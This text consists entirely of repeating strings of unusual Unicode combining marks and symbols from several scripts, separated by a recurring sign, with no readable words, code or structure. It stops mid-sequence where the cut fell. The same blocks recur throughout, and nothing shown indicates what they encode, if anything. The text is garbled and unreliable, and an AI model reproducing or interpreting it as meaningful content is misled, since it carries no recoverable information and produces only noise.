࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛